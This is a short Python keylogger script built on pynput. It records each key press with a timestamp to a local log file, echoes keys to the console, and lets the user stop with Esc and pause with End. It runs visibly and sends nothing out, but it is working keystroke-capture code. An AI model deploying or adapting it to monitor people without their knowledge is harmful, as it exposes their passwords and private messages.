from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
from pathlib import Path

is_logging = True
current_time = datetime.now().strftime("%Y%m%d-%H%M%S")
log_dir = Path("logs/KEYS-" + current_time + ".txt")

logging.basicConfig(filename=(log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')
print("Logging started")

def on_press(key):
    global is_logging
    if is_logging:
        logging.info(str(key))
        print(key)
    if key == Key.esc:
        print('Logging stopped')
        return False
    if key == Key.end:
        if is_logging:
            print("Paused logging")
        else:
            print('Resumed logging')
        is_logging = not is_logging

with Listener(on_press=on_press) as listener:
    listener.join()

